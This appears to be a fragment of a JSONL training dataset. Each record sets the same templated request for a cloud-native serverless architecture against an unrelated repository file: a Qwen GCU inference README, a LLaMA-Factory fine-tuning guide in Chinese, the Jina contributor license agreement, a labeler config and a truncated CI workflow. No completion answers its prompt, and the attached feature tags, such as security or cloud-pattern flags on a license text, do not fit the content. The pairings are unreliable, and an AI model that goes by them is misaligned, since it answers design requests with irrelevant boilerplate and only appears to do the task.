PyTorch 原生推理支持**\n\nGCU 支持 pytorch 原生推理，在 pytorch 代码上只需做少许改动就可以在 GCU 上顺利运行：\n\n1. 导入 *torch_gcu* 后端库，并载入 transfer_to_gcu\n    ``` python\n    try:\n        import torch_gcu # 导入 torch_gcu\n        from torch_gcu import transfer_to_gcu #  transfer_to_gcu\n    except Exception as e:\n        print(e)\n    ```\n2. device 名改为 *gcu*\n   ``` python\n   device = \"gcu\"\n   ```\n\n**GCU vLLM 推理**\n\nGCU 也支持 *vLLM* 原生推理，需要安装 GCU 版本的 *vLLM* 后，将设备名改为 gcu\n\n```\npython -m vllm.entrypoints.openai.api_server --served-model-name Qwen2.5-7B-Instruct --model Qwen/Qwen2.5-7B-Instruct --device gcu\n```\n", "metadata": {"source": "github.com/QwenLM/Qwen3", "file_path": "examples/gcu-support/README.md", "language": "markdown", "complexity": "simple", "star_count": 23335, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 78}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# 使用LLaMA-Factory微调Qwen模型\n\n## LLAMA-Factory简介\n[LLaMA-Factory](https://github.com/hiyouga/LLaMA-Factory)是一个简单易用且高效的大模型训练框架，支持上百种大模型的训练，框架特性主要包括：\n- 模型种类：LLaMA、LLaVA、Mistral、Mixtral-MoE、Qwen、Yi、Gemma、Baichuan、ChatGLM、Phi 等等。\n- 训练算法：（增量）预训练、（多模态）指令监督微调、奖励模型训练、PPO 训练、DPO 训练、KTO 训练、ORPO 训练等等。\n- 运算精度：16比特全参数微调、冻结微调、LoRA微调和基于AQLM/AWQ/GPTQ/LLM.int8/HQQ/EETQ的2/3/4/5/6/8比特QLoRA 微调。\n- 优化算法：GaLore、BAdam、DoRA、LongLoRA、LLaMA Pro、Mixture-of-Depths、LoRA+、LoftQ和PiSSA。\n- 加速算子：FlashAttention-2和Unsloth。\n- 推理引擎：Transformers和vLLM。\n- 实验面板：LlamaBoard、TensorBoard、Wandb、MLflow等等。\n\n本文将介绍如何使用LLAMA-Factory对Qwen2系列大模型进行微调（Qwen1.5系列模型也适用），更多特性请参考[LLaMA-Factory](https://github.com/hiyouga/LLaMA-Factory)。\n\n## 安装LLaMA-Factory\n下载并安装LLaMA-Factory：\n```bash\ngit clone --depth 1 https://github.com/hiyouga/LLaMA-Factory.git\ncd LLaMA-Factory\npip install -e \".[torch,metrics]\"\n```\n\n安装完成后，执行`llamafactory-cli version`，若出现以下提示，则表明安装成功：\n```\n----------------------------------------------------------\n| Welcome to LLaMA Factory, version 0.8.4.dev0           |\n|                                                        |\n| Project page: https://github.com/hiyouga/LLaMA-Factory |\n----------------------------------------------------------\n```\n\n## 准备训练数据\n自定义的训练数据应保存为jsonl文件，每一行的格式如下：\n```json\n{\n    \"messages\": [\n        {\n            \"role\": \"system\",\n            \"content\": \"You are a helpful assistant.\"\n        },\n        {\n            \"role\": \"user\",\n            \"content\": \"Tell me something about large language models.\"\n        },\n        {\n            \"role\": \"assistant\",\n            \"content\": \"Large language models are a type of language model that is trained on a large corpus of text data. They are capable of generating human-like text and are used in a variety of natural language processing tasks...\"\n        },\n        {\n            \"role\": \"user\",\n            \"content\": \"How about Qwen2?\"\n        },\n        {\n            \"role\": \"assistant\",\n            \"content\": \"Qwen2 is a large language model developed by Alibaba Cloud...\"\n        }\n      \n    ]\n}\n```\n\n在LLaMA-Factory文件夹下的`data/dataset_info.json`文件中注册自定义的训练数据，在文件尾部添加如下配置信息：\n```\n\"qwen_train_data\": {\n    \"file_name\": \"PATH-TO-YOUR-TRAIN-DATA\",\n    \"formatting\": \"sharegpt\",\n    \"columns\": {\n      \"messages\": \"messages\"\n    },\n    \"tags\": {\n      \"role_tag\": \"role\",\n      \"content_tag\": \"content\",\n      \"user_tag\": \"user\",\n      \"assistant_tag\": \"assistant\",\n      \"system_tag\": \"system\"\n    }\n}\n```\n\n## 配置训练参数\n设置训练参数的配置文件，我们提供了全量参数、LoRA、QLoRA训练所对应的示例文件，你可以根据自身需求自行修改，配置详情见本目录下对应的文件:\n- `qwen2-7b-full-sft.yaml`: 全量参数训练\n- `qwen2-7b-lora-sft.yaml`: LoRA训练\n- `qwen2-7b-qlora-sft.yaml`: QLoRA训练\n\n全量参数训练时的deepspeed配置文件可参考[文件](https://github.com/hiyouga/LLaMA-Factory/tree/main/examples/deepspeed)\n\n部分训练参数说明：\n\n| 参数                          | 说明                                                                                           |\n|-----------------------------|----------------------------------------------------------------------------------------------|\n| model_name_or_path          | 模型名称或路径                                                                                      |\n| stage                       | 训练阶段，可选: rm(reward modeling), pt(pretrain), sft(Supervised Fine-Tuning), PPO, DPO, KTO, ORPO |\n| do_train                    | true用于训练, false用于评估                                                                          |\n| finetuning_type             | 微调方式。可选: freeze, LoRA, full                                                                  |\n| lora_target                 | 采取LoRA方法的目标模块，默认值为all。                                                                       |\n| dataset                     | 使用的数据集，使用”,”分隔多个数据集                                                                          |\n| template                    | 数据集模板，请保证数据集模板与模型相对应。                                                                        |\n| output_dir                  | 输出路径                                                                                         |\n| logging_steps               | 日志输出步数间隔                                                                                     |\n| save_steps                  | 模型断点保存间隔                                                                                     |\n| overwrite_output_dir        | 是否允许覆盖输出目录                                                                                   |\n| per_device_train_batch_size | 每个设备上训练的批次大小                                                                                 |\n| gradient_accumulation_steps | 梯度积累步数                                                                                       |\n| learning_rate               | 学习率                                                                                          |\n| lr_scheduler_type           | 学习率曲线，可选 linear, cosine, polynomial, constant 等。                                             |\n| num_train_epochs            | 训练周期数                                                                                        |\n| bf16                        | 是否使用 bf16 格式                                                                                 |\n\n## 开始训练\n\n全量参数训练：\n```bash\nFORCE_TORCHRUN=1 llamafactory-cli train qwen2-7b-full-sft.yaml \n```\n\nLoRA训练：\n```bash\nllamafactory-cli train qwen2-7b-lora-sft.yaml \n```\n\nQLoRA训练：\n```bash\nllamafactory-cli train qwen2-7b-qlora-sft.yaml \n```\n\n使用上述训练配置，各个方法实测的显存占用如下。训练中的显存占用与训练参数配置息息相关，可根据自身实际需求进行设置。\n- 全量参数训练：42.18GB\n- LoRA训练：20.17GB\n- QLoRA训练: 10.97GB\n\n## 合并模型权重\n如果采用LoRA或者QLoRA进行训练，脚本只保存对应的LoRA权重，需要合并权重才能进行推理。**全量参数训练无需执行此步骤**\n\n\n```bash\nllamafactory-cli export qwen2-7b-merge-lora.yaml\n```\n\n权重合并的部分参数说明：\n\n| 参数                   | 说明          |\n|----------------------|-------------|\n| model_name_or_path   | 预训练模型的名称或路径 |\n| template             | 模型模板        |\n| export_dir           | 导出路径        |\n| export_size          | 最大导出模型文件大小  |\n| export_device        | 导出设备        |\n| export_legacy_format | 是否使用旧格式导出   |\n\n注意：\n- 合并Qwen2模型权重，务必将template设为`qwen`；无论LoRA还是QLoRA训练，合并权重时，`finetuning_type`均为`lora`。\n- adapter_name_or_path需要与微调中的适配器输出路径output_dir相对应。\n\n## 模型推理\n训练完成，合并模型权重之后，即可加载完整的模型权重进行推理， 推理的示例脚本如下：\n```python\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\ndevice = \"cuda\" # the device to load the model onto\nmodel_name_or_path = YOUR-MODEL-PATH\n\nmodel = AutoModelForCausalLM.from_pretrained(\n    model_name_or_path,\n    torch_dtype=\"auto\",\n    device_map=\"auto\"\n)\ntokenizer = AutoTokenizer.from_pretrained(model_name_or_path)\n\nprompt = \"Give me a short introduction to large language models.\"\nmessages = [\n    {\"role\": \"system\", \"content\": \"You are a helpful assistant.\"},\n    {\"role\": \"user\", \"content\": prompt}\n]\ntext = tokenizer.apply_chat_template(\n    messages,\n    tokenize=False,\n    add_generation_prompt=True\n)\nmodel_inputs = tokenizer([text], return_tensors=\"pt\").to(device)\n\ngenerated_ids = model.generate(\n    model_inputs.input_ids,\n    max_new_tokens=512\n)\ngenerated_ids = [\n    output_ids[len(input_ids):] for input_ids, output_ids in zip(model_inputs.input_ids, generated_ids)\n]\n\nresponse = tokenizer.batch_decode(generated_ids, skip_special_tokens=True)[0]\n```\n", "metadata": {"source": "github.com/QwenLM/Qwen3", "file_path": "examples/llama-factory/finetune-zh.md", "language": "markdown", "complexity": "medium", "star_count": 23335, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 191}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Contributor License Agreement\n\nThank you for your interest in contributing to software projects \nmanaged by Jina AI Limited (\"JINA\", \"We\" or \"Us\"). In order to \nclarify the intellectual property license granted with Contributions \nfrom any person or entity, JINA\nmust have a Contributor License Agreement (\"CLA\") on file that has\nbeen signed by each Contributor, indicating agreement to the license\nterms below. This license is for your protection as a Contributor as\nwell as the protection of JINA and its users; it does not\nchange your rights to use your own Contributions for any other purpose.\n\n\nYou accept and agree to the following terms and conditions for Your\npresent and future Contributions submitted to JINA.\n\n\n1. Definitions.\n \"You\" (or \"Your\") shall mean the copyright owner or legal entity\n authorized by the copyright owner that is making this Agreement\n with JINA. For legal entities, the entity making a\n Contribution and all other entities that control, are controlled\n by, or are under common control with that entity are considered to\n be a single Contributor. For the purposes of this definition,\n \"control\" means (i) the power, direct or indirect, to cause the\n direction or management of such entity, whether by contract or\n otherwise, or (ii) ownership of fifty percent (50%) or more of the\n outstanding shares, or (iii) beneficial ownership of such entity.\n \"Contribution\" shall mean any original work of authorship,\n including any modifications or additions to an existing work, that\n is intentionally submitted by You to JINA for inclusion\n in, or documentation of, any of the products owned or managed by\n JINA (the \"Work\"). For the purposes of this definition,\n \"submitted\" means any form of electronic, verbal, or written\n communication sent to JINA or its representatives,\n including but not limited to communication on electronic mailing\n lists, source code control systems, and issue tracking systems that\n are managed by, or on behalf of, JINA for the purpose of\n discussing and improving the Work, but excluding communication that\n is conspicuously marked or otherwise designated in writing by You\n as \"Not a Contribution.\"\n \n \n2. Grant of Copyright License. Subject to the terms and conditions of\n this Agreement, You hereby grant to JINA and to\n recipients of software distributed by JINA a perpetual,\n worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n copyright license to reproduce, prepare derivative works of,\n publicly display, publicly perform, sublicense, and distribute Your\n Contributions and such derivative works.\n \n \n3. Grant of Patent License. Subject to the terms and conditions of\n this Agreement, You hereby grant to JINA and to\n recipients of software distributed by JINA a perpetual,\n worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n (except as stated in this section) patent license to make, have\n made, use, offer to sell, sell, import, and otherwise transfer the\n Work, where such license applies only to those patent claims\n licensable by You that are necessarily infringed by Your\n Contribution(s) alone or by combination of Your Contribution(s)\n with the Work to which such Contribution(s) was submitted. If any\n entity institutes patent litigation against You or any other entity\n (including a cross-claim or counterclaim in a lawsuit) alleging\n that your Contribution, or the Work to which you have contributed,\n constitutes direct or contributory patent infringement, then any\n patent licenses granted to that entity under this Agreement for\n that Contribution or Work shall terminate as of the date such\n litigation is filed.\n \n \n4. You represent that you are legally entitled to grant the above\n license. If your employer(s) has rights to intellectual property\n that you create that includes your Contributions, you represent\n that you have received permission to make Contributions on behalf\n of that employer, that your employer has waived such rights for\n your Contributions to JINA, or that your employer has\n executed a separate Corporate CLA with JINA.\n \n \n5. You represent that each of Your Contributions is Your original\n creation (see section 7 for submissions on behalf of others). You\n represent that Your Contribution submissions include complete\n details of any third-party license or other restriction (including,\n but not limited to, related patents and trademarks) of which you\n are personally aware and which are associated with any part of Your\n Contributions.\n \n \n6. You are not expected to provide support for Your Contributions,\n except to the extent You desire to provide support. You may provide\n support for free, for a fee, or not at all. Unless required by\n applicable law or agreed to in writing, You provide Your\n Contributions on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS\n OF ANY KIND, either express or implied, including, without\n limitation, any warranties or conditions of TITLE, NON-\n INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A PARTICULAR PURPOSE.\n \n \n7. Should You wish to submit work that is not Your original creation,\n You may submit it to JINA separately from any\n Contribution, identifying the complete details of its source and of\n any license or other restriction (including, but not limited to,\n related patents, trademarks, and license agreements) of which you\n are personally aware, and conspicuously marking the work as\n \"Submitted on behalf of a third-party: [named here]\".\n \n \n8. You agree to notify JINA of any facts or circumstances of\n which you become aware that would make these representations\n inaccurate in any respect.", "metadata": {"source": "github.com/jina-ai/serve", "file_path": ".github/CLA.md", "language": "markdown", "complexity": "medium", "star_count": 21665, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 111}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Add 'label1' to any changes within 'example' folder or any subfolders\narea/docs:\n  - docs/**/*\n  - ./*.md\n\narea/testing:\n  - tests/**/*\n\narea/setup:\n  - setup.py\n  - extra-requirements.txt\n  - requirements.txt\n  - MANIFEST.in\n  - fastentrypoints.py\n\narea/core:\n  - jina/**/*\n\narea/helper:\n  - jina/*.py\n\narea/entrypoint:\n  - jina/__init__.py\n\n\narea/network:\n  - jina/peapods/**/*\n  - jina/proto/**/*\n\narea/housekeeping:\n  - .github/**/*\n  - ./.gitignore\n\narea/cicd:\n  - .github/workflows/**/*\n\narea/docker:\n  - Dockerfiles/**/*\n  - ./.dockerignore\n\narea/cli:\n  - jina_cli/**/*\n\narea/docarray:\n  - docarray/**/*\n\narea/script:\n  - script/**/*\n\ncomponent/client:\n  - jina/clients/**/*\n\ncomponent/driver:\n  - jina/drivers/**/*\n\ncomponent/executor:\n  - jina/executors/**/*\n\ncomponent/docker:\n  - jina/docker/**/*\n\nexecutor/meta:\n  - jina/executors/*.py\n\nexecutor/encoder:\n  - jina/executors/encoders/**/*\n\nexecutor/indexer:\n  - jina/executors/indexers/**/*\n\nexecutor/ranker:\n  - jina/executors/rankers/**/*\n\nexecutor/crafter:\n  - jina/executors/crafters/**/*\n\ncomponent/flow:\n  - jina/flow/**/*\n\ncomponent/logging:\n  - jina/logging/**/*\n\ncomponent/entrypoint:\n  - jina/main/**/*\n\ncomponent/peapod:\n  - jina/peapods/**/*\n\ncomponent/proto:\n  - jina/proto/**/*\n\ncomponent/type:\n  - jina/types/**/*\n\ncomponent/math:\n  - jina/math/**/*\n\ncomponent/resource:\n  - jina/resources/**/*\n\ncomponent/hub:\n  - jina/hub/**/*\n\ncomponent/jaml:\n  - jina/jaml/**/*", "metadata": {"source": "github.com/jina-ai/serve", "file_path": ".github/labeler.yml", "language": "yaml", "complexity": "medium", "star_count": 21665, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 105}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: CD\n\non:\n  push:\n    branches:\n      - master\n\n#on:\n#  push:\n#    branches-ignore:\n#      - '**'  # temporally ignore all\n\n\njobs:\n  update-schema:\n    if: |\n      !startsWith(github.event.head_commit.message, 'chore') &&\n      !startsWith(github.event.head_commit.message, 'build: hotfix') &&\n      !endsWith(github.event.head_commit.message, 'reformatted by jina-dev-bot')\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n        with:\n#          submodules: true\n          fetch-depth: 100\n      - run: |\n          truncate --size=24KB README.md > README-trunc.md\n      - uses: peter-evans/dockerhub-description@v3\n        with:\n          username: ${{ secrets.DOCKERHUB_DEVBOT_USER  }}\n          password: ${{ secrets.DOCKERHUB_DEVBOT_PWD }}\n          repository: jinaai/jina\n          readme-filepath: ./README-trunc.md\n      - uses: actions/checkout@v2.5.0\n        with:\n          repository: jina-ai/api\n          path: schema\n          token: ${{ secrets.JINA_DEV_BOT }}\n      - uses: actions/setup-python@v4\n        with:\n          python-version: 3.8\n      - uses: actions/setup-node@v2\n        with:\n          node-version: '14'\n      - run: |\n          pip install . --no-cache-dir\n          pip install docarray==0.21.0 # only valid for this version. I think we should remove this schema loading\n          pip install docarray==1.10.3\n          JINA_VERSION=$(sed -n '/^__version__/p' ./jina/__init__.py | cut -d \\' -f2)-master\n          echo \"JINA_VERSION=${JINA_VERSION}\" >> $GITHUB_ENV\n          cd schema\n          mkdir -p schemas\n          jina export schema --schema-path schemas/\"$JINA_VERSION.json\" schemas/master.json schemas/master --yaml-path \"$JINA_VERSION.yml\" master.yml --json-path \"$JINA_VERSION.json\" master.json master\n          python ../scripts/get-openapi-schemas.py\n          npm install --prefix ~ snippet-enricher-cli\n          ~/node_modules/.bin/snippet-enricher-cli --input=gateway.json --targets=shell_curl > gateway-with-code.json\n          cd -\n      - name: redoc-cli-gateway\n        uses: seeebiii/redoc-cli-github-action@v10\n        with:\n          args: 'bundle schema/gateway-with-code.json -o rest.html'\n      - name: push-to-api-repo\n        run: |\n          mkdir -p schema/rest/\n          cp rest.html schema/rest/master.html\n          cp schema/gateway.json schema/rest/master.json\n          rm schema/gateway.json schema/gateway-with-code.json\n          cd schema\n          git config --local user.email \"dev-bot@jina.ai\"\n          git config --local user.name \"Jina Dev Bot\"\n          if [[ `git status --porcelain` ]]; then\n            git pull && git add . && git commit -m \"update ${{env.JINA_VERSION}} due to ${{github.event_name}} on ${{github.repository}}\" && git push\n          fi\n\n  update-docker:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    steps:\n      - uses: benc-uk/workflow-dispatch@v1\n        with:\n          workflow: Manual Docker Build\n          inputs: '{ \"release_token\": \"${{ env.release_token }}\", \"triggered_by\": \"CD\"}'\n          token: ${{ secrets.JINA_DEV_BOT }}\n        env:\n          release_token: ${{ secrets.JINA_CORE_RELEASE_TOKEN }}\n\n  prep-testbed:\n    runs-on: ubuntu-latest\n    needs: update-schema\n    env:\n      release_token: ${{ secrets.JINA_CORE_RELEASE_TOKEN }}\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - id: set-matrix\n        run: |\n          sudo apt-get install jq\n          export value=$(bash scripts/get-all-test-paths.sh)\n          echo \"matrix=$value\" >> $GITHUB_OUTPUT\n    outputs:\n      matrix: ${{ steps.set-matrix.outputs.matrix }}\n\n  docarray-v-two-test:\n    needs: prep-testbed\n    runs-on: ubuntu-latest\n    env:\n      JINA_RANDOM_PORT_MIN: 16384\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: [\"3.10\"]\n        protobuf-version: ['==3.19.6', '']\n        pydantic-version: ['==1.10.3', '<3.0.0']\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons cp310-cp310\n      - name: Prepare environment\n        run: |\n          # Take into account in the `test-pip` the versions\n          docker build --build-arg PYDANTIC_VERSION=\"${{ matrix.pydantic-version }}\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          WHEEL_FILE=$(ls dist/*whl)\n          pip install \"$WHEEL_FILE[common,devel,test]\" --no-cache-dir\n          if [[ \"${{ matrix.protobuf-version }}\" == \"==3.19.6\" ]]; then\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.47.5 grpcio-reflection==1.47.5 grpcio-health-checking==1.47.5\n          else\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.65.5 grpcio-reflection==1.65.5 grpcio-health-checking==1.65.5\n          fi\n          pip install pydantic\"${{ matrix.pydantic-version }}\"\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n      - name: Test\n        id: test\n        run: |\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/unit/serve/runtimes/test_helper.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/deployment_http_composite\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_singleton.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_parameters_as_pydantic.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_streaming.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/csp\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/docker\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_v2.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_errors.py\n          echo \"flag it as jina for codeoverage\"\n          echo \"codecov_flag=jina\" >> $GITHUB_OUTPUT\n        timeout-minutes: 60\n        env:\n          JINA_AUTH_TOKEN: \"${{ secrets.JINA_AUTH_TOKEN }}\"\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n\n  stateful-docarray-v-two-test:\n    needs: prep-testbed\n    runs-on: ubuntu-latest\n    env:\n      JINA_RANDOM_PORT_MIN: 16384\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: [\"3.10\"]\n        protobuf-version: ['==3.19.6', '']\n        pydantic-version: ['==1.10.3', '<3.0.0']\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons cp310-cp310\n      - name: Prepare environment\n        run: |\n          # Take into account in the `test-pip` the versions\n          docker build --build-arg PYDANTIC_VERSION=\"${{ matrix.pydantic-version }}\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          WHEEL_FILE=$(ls dist/*whl)\n          pip install \"$WHEEL_FILE[common,devel,test]\" --no-cache-dir\n          if [[ \"${{ matrix.protobuf-version }}\" == \"==3.19.6\" ]]; then\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.47.5 grpcio-reflection==1.47.5 grpcio-health-checking==1.47.5\n          else\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.65.5 grpcio-reflection==1.65.5 grpcio-health-checking==1.65.5\n          fi\n          pip install pydantic\"${{ matrix.pydantic-version }}\"\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n      - name: Test stateful\n        id: test_stateful\n        run: |\n          JINA_LOG_LEVEL=DEBUG JINA_RANDOM_PORT_MAX=\"60535\" pytest --suppress-no-test-exit-code --maxfail 1 --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/stateful\n          echo \"flag it as jina for codeoverage\"\n          echo \"codecov_flag=jina\" >> $GITHUB_OUTPUT\n        timeout-minutes: 30\n        env:\n          JINA_AUTH_TOKEN: \"${{ secrets.JINA_AUTH_TOKEN }}\"\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n\n  mark-dev-N:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Check out repository\n        uses: actions/checkout@v2.5.0\n        with:\n          fetch-depth: 200\n\n      - name: Set up Python ${{ matrix.python }}\n        uses: actions/setup-python@v2\n        with:\n          python-version: ${{ matrix.python }}\n\n      - id: computedevdelta\n        run: |\n          git fetch --depth=200\n          LAST_VER=$(git tag -l | sort -V | tail -n1)\n          COMMITS_SINCE_LAST_VER=$(git rev-list $LAST_VER..HEAD --count)\n          echo \"devdelta=$COMMITS_SINCE_LAST_VER\" >> $GITHUB_OUTPUT\n          INIT_FILE='jina/__init__.py'\n          RELEASE_VER=$(sed -n '/^__version__/p' $INIT_FILE | cut -d \\' -f2)\n          echo \"LAST_VER $LAST_VER\"\n          echo \"COMMITS_SINCE_LAST_VER $COMMITS_SINCE_LAST_VER\"\n          echo \"RELEASE_VER $RELEASE_VER\"\n          echo \"devdelta=$COMMITS_SINCE_LAST_VER\" >> $GITHUB_OUTPUT\n          echo \"releasever=$RELEASE_VER\" >> $GITHUB_OUTPUT\n    outputs:\n      devdelta: ${{ steps.computedevdelta.outputs.devdelta }}\n      releasever: ${{ steps.computedevdelta.outputs.releasever }}\n\n  # Build the wheels for Linux and macOS for Python 3.8 and newer\n  build-wheels:\n    runs-on: ${{ matrix.os }}\n    needs: [mark-dev-N]\n    strategy:\n      # Ensure that a wheel builder finishes even if another fails\n      fail-fast: false\n      matrix:\n        include:\n          # linux\n          - os: ubuntu-latest\n            python: '3.8'\n            python-manylinux-tag: \"cp38-cp38\"\n          - os: ubuntu-latest\n            python: '3.9'\n            python-manylinux-tag: \"cp39-cp39\"\n          - os: ubuntu-latest\n            python: '3.10'\n            python-manylinux-tag: \"cp310-cp310\"\n          - os: ubuntu-latest\n            python: '3.11'\n            python-manylinux-tag: \"cp311-cp311\"\n\n          # MacOS emulated\n          - os: macos-latest\n            python: '3.8'\n            python-cibuildwheels: '38'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n          - os: macos-latest\n            python: '3.9'\n            python-cibuildwheels: '39'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n          - os: macos-latest\n            python: '3.10'\n            python-cibuildwheels: '310'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n          - os: macos-latest\n            python: '3.11'\n            python-cibuildwheels: '311'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n\n          # MacOS native\n          - os: macos-latest\n            python: '3.8'\n            python-cibuildwheels: '38'\n            platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n          - os: macos-latest\n            python: '3.9'\n            